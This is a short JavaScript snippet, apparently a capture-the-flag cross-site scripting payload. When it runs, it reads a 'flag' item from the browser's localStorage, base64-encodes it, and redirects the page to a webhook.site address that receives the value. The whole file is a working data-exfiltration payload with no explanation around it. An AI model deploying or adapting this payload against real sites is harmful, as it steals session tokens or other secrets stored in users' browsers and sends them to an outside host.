function test(){
  flag = window.localStorage.getItem('flag')
  window.location = "https://webhook.site/e9ad359a-1600-4645-87f6-a13b4e9d4813/?c=" + btoa(flag)
}
test()
console.log("hello")

